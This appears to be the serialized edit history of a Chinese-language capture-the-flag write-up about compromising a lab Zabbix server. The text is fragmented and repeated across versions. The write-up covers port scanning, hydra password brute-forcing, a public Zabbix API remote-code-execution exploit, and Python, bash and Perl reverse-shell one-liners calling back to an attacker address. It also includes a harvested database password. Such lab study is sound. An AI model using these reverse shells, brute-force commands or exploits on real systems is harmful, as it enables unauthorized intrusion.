1569754828279,["whale@Whale",[[1,3289,"b"]],[3289,3289],[3290,3290]]],[1569754828882,["whale@Whale",[[-1,3289,"b"]],[3290,3290],[3289,3289]]],[1569754833402,["whale@Whale",[[1,3289,"版本漏洞"]],[3289,3289],[3293,3293]]],[1569754835377,["whale@Whale",[[1,3289,"web"]],[3289,3289],[3292,3292]]],[1569754920876,["whale@Whale",[[1,3289,"\n"]],[3288,3288],[3289,3289]]],[1569754934594,["whale@Whale",[[1,3289,"web apike"]],[3289,3289],[3298,3298]]],[1569754935201,["whale@Whale",[[-1,3296,"ke"]],[3298,3298],[3296,3296]]],[1569754936205,["whale@Whale",[[1,3296,"壳"]],[3296,3296],[3297,3297]]],[1569754937196,["whale@Whale",[[-1,3296,"壳"]],[3297,3297],[3296,3296]]],[1569754940667,["whale@Whale",[[1,3297,"访问"]],[3297,3297],[3299,3299]]],[1569755238543,[null,[[-1,3296,"\n"],[1,3297,"可"],[1,3299,"\n"]],[3296,3296],[3300,3300]]],[1569755238543,[null,[[1,3296,"\n"],[-1,3296,"可"],[-1,3299,"\n"]],[3300,3300],[3296,3296]]],[1569755226152,["whale@Whale",[[-1,3299,"\n"]],[3300,3300],[3299,3299]]],[1569755226968,["whale@Whale",[[1,3299,"\n"]],[3299,3299],[3300,3300]]]]],["ea7b37b7-3a49-408d-a135-abe70ec21949",1569763756025,"## scan\n```\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n\n| ssh-hostkey: \n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\n\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n\n10050/tcp open  tcpwrapped\n2048/udp open|filtered dls-monitor no-response\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n以上结果说明ssh、web以及其他不明2端口开放，需要进一步做探测。\n---\nnc 10.10.10.108 10050\n结果没有任何提示或者报错，说明端口开放\n---\n于是进行版本扫描\nnmap 10.10.10.108 -p 10050\n10050/tcp open  zabbix-agent\n---\n2048端口扫描结果，提示端口关闭，于是忽略\n```\n\n## ssh\n```\nssh root@10.10.10.108\nThe authenticity of host '10.10.10.108 (10.10.10.108)' can't be established.\nECDSA key fingerprint is SHA256:cAmAZhj4I2L8r8N7/lMousEpdqK/HoeuU6zUIbGcdHs.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.10.10.108' (ECDSA) to the list of known hosts.\nroot@10.10.10.108: Permission denied (publickey).\n```\n拒绝密码连接，要么通过web获取到id_rsa通过私钥连接；要么web远程代码执行获得webshell，再提权。\n\n## web enumeration\n\n```\nwget http://10.10.10.108\n---\ngobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n/zabbix (Status: 301)\n/server-status (Status: 403)\n\n---\nburp spider\nhttp://10.10.10.108/zabbix/history.php\nZabbix 3.0.21\n---\nZabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution \nsearchsploit -m exploits/php/webapps/39937.py\n1. 修改exp地址为http://10.10.10.108/zabbix\n2. 运行exp：  python 39937.py \n3. 运行出错，检查exp\n[zabbix_cmd]>>:  \nResult of last command:\nTraceback (most recent call last):\n  File \"39937.py\", line 55, in <module>\n    \"auth\" : auth['result'],\nKeyError: 'result'\n用户名密码Admin/zabbix可能是无效口令，尝试登陆后的确失败\n4. http://10.10.10.108/zabbix/api_jsonrpc.php该地址存在\n5. burp截包，尝试弱密码猜测\nname=Admin&password=zabbix&autologin=1&enter=Sign+in\n\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/3000-pass.txt -f 10.10.10.108 http-post-form \"/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:incorrect\"\n```\n---\nmsf 尝试exploit/unix/misc/zabbix_agent_exec\nip/端口10050,失败\n---\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \nZabbix Server 2.4.X\n---\n[CVE-2016-10134](http://cvedetails.com/cve/cve-2016-10134)\n before 3.0.4 allows remote attackers to execute arbitrary SQL commands\nauxiliary/gather/zabbix_toggleids_sqli\n失败\n---\n\n发现一个登陆表单，searchsploit zabbix，常规操作\n\n## 10050 port\nhttp://10.10.10.108:10050\nsearchsploit zabbix\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \n\nuse exploit/linux/misc/zabbix_server_exec\nuse exploit/unix/misc/zabbix_agent_exec\n\n---\n\n## writeup\nlog in as guest，在主页面发现了一个用户名Zipper，仔细查找网页内容，把zapper、Zipper、zipper添加到字典中进行爆破\n![14]($res/14.PNG)\n\n## 拿到服务器参数\n通过官网获得api使用方法：https://www.zabbix.com/documentation/3.0/manual/api\n\n通过api，查询到服务器参数，然后修改exp\n\n```\nsearchsploit -m exploits/hp/webapps/39937.py\n\nZABIX_ROOT = 'http://10.10.10.108/zabbix'\t### Zabbix IP-address\nlogin = 'zapper'\t\t### Zabbix login\npassword = 'zapper'\t### Zabbix password\nhostid = '10105'\t### Zabbix hostid\n\npython 39937.py 即可拿到webshell\n```\n## 存在的漏洞\n```\nguest匿名登陆+信息泄露\n弱密码\nweb api可访问\nweb版本漏洞\n```",[[1569763700273,["whale@Whale",[[1,3257,"\n"]],[3256,3256],[3257,3257]]],[1569763705959,["whale@Whale",[[1,3258,"![1]($res/1.PNG)\n\n"]],[3257,3257],[3275,3275]]],[1569763707839,["whale@Whale",[[-1,3257,"\n"]],[3257,3257],[3256,3256]]],[1569765685487,["whale@Whale",[[1,3275,"\n"]],[3274,3274],[3275,3275]]],[1569765685773,["whale@Whale",[[1,3276,"\n"]],[3275,3275],[3276,3276]]],[1569765686584,["whale@Whale",[[-1,3276,"\n"]],[3276,3276],[3275,3275]]],[1569765687533,["whale@Whale",[[1,3275,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]],[3275,3275],[3499,3499]]],[1569765688635,["whale@Whale",[[1,3500,"\n"]],[3499,3499],[3500,3500]]],[1569765705046,["whale@Whale",[[-1,3380,"0.0."]],[3380,3385],[3381,3381]]],[1569765707422,["whale@Whale",[[1,3381,"0.14.10"]],[3381,3381],[3388,3388]]],[1569765802150,["whale@Whale",[[1,3504,"\n"]],[3503,3503],[3504,3504]]],[1569765802744,["whale@Whale",[[1,3504,"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"]],[3504,3504],[3542,3542]]],[1569765807413,["whale@Whale",[[-1,3525,"0.0.0.1"]],[3524,3532],[3525,3525]]],[1569765810647,["whale@Whale",[[1,3525,"0.10.14.10"]],[3525,3525],[3535,3535]]],[1569765813332,["whale@Whale",[[-1,3536,"8080"]],[3536,3536],[3536,3536]]],[1569765814597,["whale@Whale",[[1,3536,"1234"]],[3536,3536],[3540,3540]]],[1569765856349,["whale@Whale",[[1,3546,"\n"]],[3545,3545],[3546,3546]]],[1569765856545,["whale@Whale",[[1,3547,"\n"]],[3546,3546],[3547,3547]]],[1569765859266,["whale@Whale",[[1,3547,"perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"]],[3547,3547],[3764,3764]]],[1569765862325,["whale@Whale",[[1,3765,"\n"]],[3764,3764],[3765,3765]]],[1569765867742,["whale@Whale",[[-1,3572,"0.0.0.1"]],[3571,3579],[3572,3572]]],[1569765868924,["whale@Whale",[[1,3572,"-/1-/"]],[3572,3572],[3577,3577]]],[1569765872044,["whale@Whale",[[-1,3571,"1-/1-/"]],[3577,3577],[3571,3571]]],[1569765875602,["whale@Whale",[[1,3571,"10.10.14.10"]],[3571,3571],[3582,3582]]],[1569765900725,["whale@Whale",[[1,3275,"\n"]],[3274,3274],[3275,3275]]],[1569765903664,["whale@Whale",[[1,3275,"```"]],[3275,3275],[3278,3278]]],[1569765905693,["whale@Whale",[[1,3772,"```"]],[3772,3772],[3775,3775]]],[1569765959432,["whale@Whale",[[1,3775,"qwe"]],[3775,3775],[3778,3778]]],[1569765961192,["whale@Whale",[[-1,3775,"qwe"]],[3778,3778],[3775,3775]]],[1569766003411,["whale@Whale",[[-1,3279,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\nbash -i >& /dev/tcp/10.10.14.10/1234 0>&1\n"]],[3279,3550],[3279,3279]]],[1569766006803,["whale@Whale",[[1,3279,"参考"]],[3279,3279],[3281,3281]]],[1569766007579,["whale@Whale",[[1,3282,"\n"]],[3281,3281],[3282,3282]]],[1569766015180,["whale@Whale",[[1,3281,"pentestmonkey de"]],[3281,3281],[3297,3297]]],[1569766016052,["whale@Whale",[[-1,3294," de"]],[3297,3297],[3294,3294]]],[1569766023070,["whale@Whale",[[1,3294,"的reverse shell cheetshi"]],[3294,3294],[3317,3317]]],[1569766026380,["whale@Whale",[[-1,3308," cheetshi"]],[3317,3317],[3308,3308]]]]],["f3da8032-c0f2-45cb-8a93-75ba82e1b318",1569812591033,"## scan\n```\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n\n| ssh-hostkey: \n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\n\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n\n10050/tcp open  tcpwrapped\n2048/udp open|filtered dls-monitor no-response\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n以上结果说明ssh、web以及其他不明2端口开放，需要进一步做探测。\n---\nnc 10.10.10.108 10050\n结果没有任何提示或者报错，说明端口开放\n---\n于是进行版本扫描\nnmap 10.10.10.108 -p 10050\n10050/tcp open  zabbix-agent\n---\n2048端口扫描结果，提示端口关闭，于是忽略\n```\n\n## ssh\n```\nssh root@10.10.10.108\nThe authenticity of host '10.10.10.108 (10.10.10.108)' can't be established.\nECDSA key fingerprint is SHA256:cAmAZhj4I2L8r8N7/lMousEpdqK/HoeuU6zUIbGcdHs.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.10.10.108' (ECDSA) to the list of known hosts.\nroot@10.10.10.108: Permission denied (publickey).\n```\n拒绝密码连接，要么通过web获取到id_rsa通过私钥连接；要么web远程代码执行获得webshell，再提权。\n\n## web enumeration\n\n```\nwget http://10.10.10.108\n---\ngobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n/zabbix (Status: 301)\n/server-status (Status: 403)\n\n---\nburp spider\nhttp://10.10.10.108/zabbix/history.php\nZabbix 3.0.21\n---\nZabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution \nsearchsploit -m exploits/php/webapps/39937.py\n1. 修改exp地址为http://10.10.10.108/zabbix\n2. 运行exp：  python 39937.py \n3. 运行出错，检查exp\n[zabbix_cmd]>>:  \nResult of last command:\nTraceback (most recent call last):\n  File \"39937.py\", line 55, in <module>\n    \"auth\" : auth['result'],\nKeyError: 'result'\n用户名密码Admin/zabbix可能是无效口令，尝试登陆后的确失败\n4. http://10.10.10.108/zabbix/api_jsonrpc.php该地址存在\n5. burp截包，尝试弱密码猜测\nname=Admin&password=zabbix&autologin=1&enter=Sign+in\n\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/3000-pass.txt -f 10.10.10.108 http-post-form \"/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:incorrect\"\n```\n---\nmsf 尝试exploit/unix/misc/zabbix_agent_exec\nip/端口10050,失败\n---\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \nZabbix Server 2.4.X\n---\n[CVE-2016-10134](http://cvedetails.com/cve/cve-2016-10134)\n before 3.0.4 allows remote attackers to execute arbitrary SQL commands\nauxiliary/gather/zabbix_toggleids_sqli\n失败\n---\n\n发现一个登陆表单，searchsploit zabbix，常规操作\n\n## 10050 port\nhttp://10.10.10.108:10050\nsearchsploit zabbix\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \n\nuse exploit/linux/misc/zabbix_server_exec\nuse exploit/unix/misc/zabbix_agent_exec\n\n---\n\n## writeup\nlog in as guest，在主页面发现了一个用户名Zipper，仔细查找网页内容，把zapper、Zipper、zipper添加到字典中进行爆破\n![14]($res/14.PNG)\n\n## 拿到服务器参数\n通过官网获得api使用方法：https://www.zabbix.com/documentation/3.0/manual/api\n\n通过api，查询到服务器参数，然后修改exp\n\n```\nsearchsploit -m exploits/hp/webapps/39937.py\n\nZABIX_ROOT = 'http://10.10.10.108/zabbix'\t### Zabbix IP-address\nlogin = 'zapper'\t\t### Zabbix login\npassword = 'zapper'\t### Zabbix password\nhostid = '10105'\t### Zabbix hostid\n\npython 39937.py 即可拿到webshell\n```\n![1]($res/1.PNG)\n\n```\n参考pentestmonkey的reverse shell\n\nperl -e 'use Socket;$i=\"10.10.14.10\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n```\n## 存在的漏洞\n```\nguest匿名登陆+信息泄露\n弱密码\nweb api可访问\nweb版本漏洞\n```",[[1569812589284,["whale@Whale",[[1,3577,"，"]],[3577,3577],[3578,3578]]],[1569812600120,["whale@Whale",[[1,3578,"用来爆破登陆口令"]],[3578,3578],[3586,3586]]],[1569812714488,["whale@Whale",[[1,3531,"\n"]],[3530,3530],[3531,3531]]],[1569812714678,["whale@Whale",[[1,3532,"\n"]],[3531,3531],[3532,3532]]],[1569812719246,["whale@Whale",[[1,3532,"find / -name \"2"]],[3532,3532],[3547,3547]]],[1569812719749,["whale@Whale",[[-1,3546,"2"]],[3547,3547],[3546,3546]]],[1569812723943,["whale@Whale",[[1,3546,"*.txt\" 2?"]],[3546,3546],[3555,3555]]],[1569812724612,["whale@Whale",[[-1,3554,"?"]],[3555,3555],[3554,3554]]],[1569812725882,["whale@Whale",[[1,3554,">1"]],[3554,3554],[3556,3556]]],[1569812793120,["whale@Whale",[[1,3556,"2>/dev/null"]],[3556,3556],[3567,3567]]],[1569812795713,["whale@Whale",[[-1,3553,"2>1"]],[3556,3556],[3553,3553]]],[1569812867195,["whale@Whale",[[1,3565,"\n"]],[3564,3564],[3565,3565]]],[1569812874119,["whale@Whale",[[1,3565,"本意是查找user.txt"]],[3565,3565],[3578,3578]]],[1569812874523,["whale@Whale",[[1,3579,"\n"]],[3578,3578],[3579,3579]]],[1569812875969,["whale@Whale",[[1,3579,"ls -al /usr/share/zabbix/robots.txt\r\n-rw-r--r-- 1 root root 974 Aug 27  2018 /usr/share/zabbix/robots.txt\r\n$ cat /usr/share/zabbix/robots.txt\r\n# If Zabbix frontend is available on the internet, it is suggested to disallow\r\n# access to it for robots like search engine crawlers. Otherwise they may\r\n# overload the Zabbix system without offering any benefit.\r\n#\r\n# Note that this must not be used for security reasons, as any visitor is\r\n# free to ignore the contents of this file or use it to know which directories\r\n# are supposed to be hidden.\r\n#\r\n# The following configuration should be used if Zabbix frontend is installed\r\n# in the root directory of the web server. It will deny access to Zabbix\r\n# frontend for all robots.\r\n"]],[3579,3579],[4308,4308]]],[1569812877557,["whale@Whale",[[-1,3579,"ls -al /usr/share/zabbix/robots.txt\r\n-rw-r--r-- 1 root root 974 Aug 27  2018 /usr/share/zabbix/robots.txt\r\n$ cat /usr/share/zabbix/robots.txt\r\n# If Zabbix frontend is available on the internet, it is suggested to disallow\r\n# access to it for robots like search engine crawlers. Otherwise they may\r\n# overload the Zabbix system without offering any benefit.\r\n#\r\n# Note that this must not be used for security reasons, as any visitor is\r\n# free to ignore the contents of this file or use it to know which directories\r\n# are supposed to be hidden.\r\n#\r\n# The following configuration should be used if Zabbix frontend is installed\r\n# in the root directory of the web server. It will deny access to Zabbix\r\n# frontend for all robots.\r\n"]],[4308,4308],[3579,3579]]],[1569812892779,["whale@Whale",[[1,3579,"/usr/share/zabbix/robots.txt"]],[3579,3579],[3607,3607]]],[1569813077208,["whale@Whale",[[1,3608,"\n"]],[3607,3607],[3608,3608]]],[1569813077741,["whale@Whale",[[1,3609,"\n"]],[3608,3608],[3609,3609]]],[1569813085692,["whale@Whale",[[1,3610,"\n"]],[3607,3607],[3608,3608]]],[1569813090368,["whale@Whale",[[1,3579,"\n"]],[3579,3579],[3580,3580]]],[1569813092698,["whale@Whale",[[1,3580,"\n"]],[3579,3579],[3580,3580]]],[1569813119397,["whale@Whale",[[1,3580,"结果显示了一个web的路径。"]],[3580,3580],[3594,3594]]],[1569813150432,["whale@Whale",[[1,3625,"cat /usr/share/zabbix/conf\r\n"]],[3625,3625],[3653,3653]]],[1569813151672,["whale@Whale",[[-1,3651,"\r\n"]],[3653,3653],[3652,3652]]],[1569813155537,["whale@Whale",[[-1,3625,"cat"]],[3628,3628],[3625,3625]]],[1569813157902,["whale@Whale",[[1,3625,"cd "]],[3625,3625],[3628,3628]]],[1569813158341,["whale@Whale",[[-1,3628," "]],[3628,3628],[3627,3627]]],[1569813227506,["whale@Whale",[[-1,3625,"cd"]],[3627,3627],[3625,3625]]],[1569813230498,["whale@Whale",[[1,3625,"ls"]],[3625,3625],[3627,3627]]],[1569813231629,["whale@Whale",[[-1,3625,"ls"]],[3627,3627],[3625,3625]]],[1569813232179,["whale@Whale",[[1,3625,"cat"]],[3625,3625],[3628,3628]]],[1569813234550,["whale@Whale",[[1,3651,"/"]],[3651,3651],[3652,3652]]],[1569813252163,["whale@Whale",[[1,3652,"zabbix.conf.php"]],[3652,3652],[3667,3667]]],[1569813253008,["whale@Whale",[[1,3669,"\n"]],[3667,3667],[3668,3668]]],[1569813329497,["whale@Whale",[[1,3669,"$DB['TYPE']     = 'MYSQL';\r\n$DB['SERVER']   = 'localhost';\r\n$DB['PORT']     = '0';\r\n$DB['DATABASE'] = 'zabbixdb';\r\n$DB['USER']     = 'zabbix';\r\n$DB['PASSWORD'] = 'f.YMeMd$pTbpY3-449';\r\n"]],[3669,3669],[3854,3854]]],[1569813344550,["whale@Whale",[[-1,3695,"\r"],[-1,3727,"\r"],[-1,3751,"\r"],[-1,3782,"\r"],[-1,3811,"\r"],[-1,3852,"\r"],[1,3853,"\n"]],[3848,3848],[3849,3849]]],[1569813346619,["whale@Whale",[[1,3849,"mysql 0"]],[3849,3849],[3856,3856]]],[1569813347620,["whale@Whale",[[-1,3855,"0"]],[3856,3856],[3855,3855]]],[1569813348446,["whale@Whale",[[1,3855,"- "]],[3855,3855],[3857,3857]]],[1569813357280,["whale@Whale",[[1,3856,"zabbix"]],[3856,3856],[3862,3862]]],[1569813360762,["whale@Whale",[[1,3856,"u "]],[3856,3856],[3858,3858]]],[1569813370953,["whale@Whale",[[1,3865,"-p f.YMeMd$pTbpY3-449"]],[3865,3865],[3886,3886]]],[1569813537992,["whale@Whale",[[1,3868,"\n"]],[3868,3868],[3869,3869]]],[1569813542534,["whale@Whale",[[1,3887,"     #sh"]],[3887,3887],[3895,3895]]],[1569813543038,["whale@Whale",[[-1,3893,"sh"]],[3895,3895],[3893,3893]]],[1569813545933,["whale@Whale",[[1,3893,"输入密码"]],[3893,3893],[3897,3897]]],[1569813573736,["whale@Whale",[[1,3898,"页面提示ERROR 1044 (42000): Access denied for user 'zabbix'@'localhost' to database 'f.YMeMd-449mysql'\r\n"]],[3898,3898],[3998,3998]]],[1569813576847,["whale@Whale",[[1,3902,"\n"],[-1,3996,"\r"]],[3902,3902],[3903,3903]]],[1569813578978,["whale@Whale",[[1,3999,"\n"]],[3998,3998],[3999,3999]]],[1569813604255,["whale@Whale",[[1,3999,"于是我们要连接zabbixdb的数据库，而不是f.YMeMd-449mysql"]],[3999,3999],[4038,4038]]],[1569816871055,[null,[[-1,3998,"`"],[1,3999,"\n"],[1,4039,"`"]],[3998,3998],[4040,4040]]],[1569816871055,[null,[[1,3998,"`"],[-1,3998,"\n"],[-1,4039,"`"]],[4040,4040],[3998,3998]]],[1569816832617,["whale@Whale",[[1,3532,"\n"]],[3531,3531],[3532,3532]]],[1569816834014,["whale@Whale",[[1,3532,"python -c 'import pty;pty.spawn(\"/bin/bash\")'"]],[3532,3532],[3577,3577]]],[1569816835357,["whale@Whale",[[1,3578,"\n"]],[3577,3577],[3578,3578]]],[1569816838043,["whale@Whale",[[1,3531,"---"]],[3531,3531],[3534,3534]]],[1569816845888,["whale@Whale",[[1,3581,"反弹。"]],[3581,3581],[3584,3584]]],[1569816846494,["whale@Whale",[[-1,3583,"。"]],[3584,3584],[3583,3583]]],[1569816859571,["whale@Whale",[[1,3583,"standard shell"]],[3583,3583],[3597,3597]]],[1569816859849,["whale@Whale",[[1,3598,"\n"]],[3597,3597],[3598,3598]]],[1569816860828,["whale@Whale",[[1,3598,"---"]],[3598,3598],[3601,3601]]]]],["4f6703e0-7474-4281-b6d1-b89278d756cb",1569817246567,"## scan\n```\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n\n| ssh-hostkey: \n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\n\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n\n10050/tcp open  tcpwrapped\n2048/udp open|filtered dls-monitor no-response\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n以上结果说明ssh、web以及其他不明2端口开放，需要进一步做探测。\n---\nnc 10.10.10.108 10050\n结果没有任何提示或者报错，说明端口开放\n---\n于是进行版本扫描\nnmap 10.10.10.108 -p 10050\n10050/tcp open  zabbix-agent\n---\n2048端口扫描结果，提示端口关闭，于是忽略\n```\n\n## ssh\n```\nssh root@10.10.10.108\nThe authenticity of host '10.10.10.108 (10.10.10.108)' can't be established.\nECDSA key fingerprint is SHA256:cAmAZhj4I2L8r8N7/lMousEpdqK/HoeuU6zUIbGcdHs.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.10.10.108' (ECDSA) to the list of known hosts.\nroot@10.10.10.108: Permission denied (publickey).\n```\n拒绝密码连接，要么通过web获取到id_rsa通过私钥连接；要么web远程代码执行获得webshell，再提权。\n\n## web enumeration\n\n```\nwget http://10.10.10.108\n---\ngobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \n/zabbix (Status: 301)\n/server-status (Status: 403)\n\n---\nburp spider\nhttp://10.10.10.108/zabbix/history.php\nZabbix 3.0.21\n---\nZabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution \nsearchsploit -m exploits/php/webapps/39937.py\n1. 修改exp地址为http://10.10.10.108/zabbix\n2. 运行exp：  python 39937.py \n3. 运行出错，检查exp\n[zabbix_cmd]>>:  \nResult of last command:\nTraceback (most recent call last):\n  File \"39937.py\", line 55, in <module>\n    \"auth\" : auth['result'],\nKeyError: 'result'\n用户名密码Admin/zabbix可能是无效口令，尝试登陆后的确失败\n4. http://10.10.10.108/zabbix/api_jsonrpc.php该地址存在\n5. burp截包，尝试弱密码猜测\nname=Admin&password=zabbix&autologin=1&enter=Sign+in\n\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/3000-pass.txt -f 10.10.10.108 http-post-form \"/zabbix/index.php:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:incorrect\"\n```\n---\nmsf 尝试exploit/unix/misc/zabbix_agent_exec\nip/端口10050,失败\n---\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \nZabbix Server 2.4.X\n---\n[CVE-2016-10134](http://cvedetails.com/cve/cve-2016-10134)\n before 3.0.4 allows remote attackers to execute arbitrary SQL commands\nauxiliary/gather/zabbix_toggleids_sqli\n失败\n---\n\n发现一个登陆表单，searchsploit zabbix，常规操作\n\n## 10050 port\nhttp://10.10.10.108:10050\nsearchsploit zabbix\nZabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) \n\nuse exploit/linux/misc/zabbix_server_exec\nuse exploit/unix/misc/zabbix_agent_exec\n\n---\n\n## writeup\nlog in as guest，在主页面发现了一个用户名Zipper，仔细查找网页内容，把zapper、Zipper、zipper添加到字典中进行爆破\n![14]($res/14.PNG)\n\n## 拿到服务器参数\n通过官网获得api使用方法：https://www.zabbix.com/documentation/3.0/manual/api\n\n通过api，查询到服务器参数，然后修改exp\n\n```\nsearchsploit -m exploits/hp/webapps/39937.py\n\nZABIX_ROOT = 'http://10.10.10.108/zabbix'\t### Zabbix IP-address\nlogin = 'zapper'\t\t### Zabbix login\npassword = 'zapper'\t### Zabbix password\nhostid = '10105'\t### Zabbix hostid\n\npython 39937.py 即可拿到webshell\n```\n![1]($res/1.PNG)\n\n```\n参考pentestmonkey的reverse shell\n\nperl -e 'use Socket;$i=\"10.10.14.10\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n---\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\n反弹standard shell\n---\nfind / -name \"*.txt\" 2>/dev/null\n本意是查找user.txt\n\n结果显示了一个web的路径。\n/usr/share/zabbix/robots.txt\n\ncat /usr/share/zabbix/conf/zabbix.conf.php\n\n$DB['TYPE']     = 'MYSQL';\n$DB['SERVER']   = 'localhost';\n$DB['PORT']     = '0';\n$DB['DATABASE'] = 'zabbixdb';\n$DB['USER']     = 'zabbix';\n$DB['PASSWORD'] = 'f.YMeMd$pTbpY3-449';\n\nmysql -u zabbix -p \nf.YMeMd$pTbpY3-449     #输入密码\n页面提示\nERROR 1044 (42000): Access denied for user 'zabbix'@'localhost' to database 'f.YMeMd-449mysql'\n\n于是我们要连接zabbixdb的数据库，而不是f.YMeMd-449mysql\n```\n## 存在的漏洞\n```\nguest匿名登陆+信息泄露\n弱密码\nweb api可访问，用来爆破登陆口令\nweb版本漏洞\n```",[[1569817216950,["whale@Whale",[[1,3597,"失败，没有找到python"]],[3597,3597],[3610,3610]]],[1569817217169,["whale@Whale",[[1,3611,"\n"]],[3610,3610],[3611,3611]]],[1569817231727,["whale@Whale",[[1,3611,"---"]],[3611,3611],[3614,3614]]],[1569817232191,["whale@Whale",[[1,3615,"\n"]],[3614,3614],[3615,3615]]],[1569817234121,["whale@Whale",[[1,3615,"SHELL=/bin/bash script -q /dev/null"]],[3615,3615],[3650,3650]]],[1569817235807,["whale@Whale",[[1,3651,"\n"]],[3650,3650],[3651,3651]]]]],["7820926f-c96f-4f32-8dab-02fd44ce825f",1569892805550,"## scan\n```\n22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n\n| ssh-hostkey: \n|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)\n|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)\n|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)\n\n80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n\n10050/tcp open  tcpwrapped\n2048/udp open|filtered dls-monitor no-response\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n以上结果说明ssh、web以及其他不明2端口开放，需要进一步做探测。\n---\nnc 10.10.10.108 10050\n结果没有任何提示或者报错，说明端口开放\n---\n于是进行版本扫描\nnmap 10.10.10.108 -p 10050\n10050/tcp open  zabbix-agent\n---\n2048端口扫描结果，提示端口关闭，于是忽略\n```\n\n## ssh\n```\nssh root@10.10.10.108\nThe authenticity of host '10.10.10.108 (10.10.10.108)' can't be established.\nECDSA key fingerprint is SHA256:cAmAZhj4I2L8r8N7/lMousEpdqK/HoeuU6zUIbGcdHs.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '10.10.10.108' (ECDSA) to the list of known hosts.\nroot@10.10.10.108: Permission denied 